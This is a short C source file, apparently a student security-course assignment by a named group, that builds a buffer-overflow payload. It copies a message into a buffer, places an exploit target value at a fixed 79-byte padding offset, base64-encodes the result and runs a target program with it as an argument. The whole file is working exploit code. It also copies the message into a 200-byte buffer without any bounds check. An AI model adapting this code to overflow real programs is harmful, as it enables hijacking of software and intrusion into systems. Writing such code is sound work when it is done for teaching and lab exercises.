// Authors: einararn22, hlynurv22
// Group: 2
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "exploit_program.h"
#include "run_program.h"
#include "base64.h"

extern char *EXPLOIT_TARGET;

int exploit_program(char *program, char *message) {
    char BUFFER[200];
    int MESSAGE_LENGTH = strlen(message); 
    int PADDING_LENGTH = 79;

    int i = 0;
    while (i < MESSAGE_LENGTH) {BUFFER[i] = message[i]; i++;}


    int m = 0;
    while (EXPLOIT_TARGET[m] != '\0') { BUFFER[m + PADDING_LENGTH] = EXPLOIT_TARGET[m]; m++;}

    // Null-terminate the exploit buffer
    BUFFER[m + PADDING_LENGTH] = '\0';

    // Encode the exploit buffer using base64
    char ENCODED_BUFFER[200];
    b64_encode((const unsigned char *) BUFFER, 200, (unsigned char *) ENCODED_BUFFER);

    // Run the program with the encoded buffer as an argument
    char *argv[] = { "-b", ENCODED_BUFFER, NULL };
    return run_program(program, argv);

}

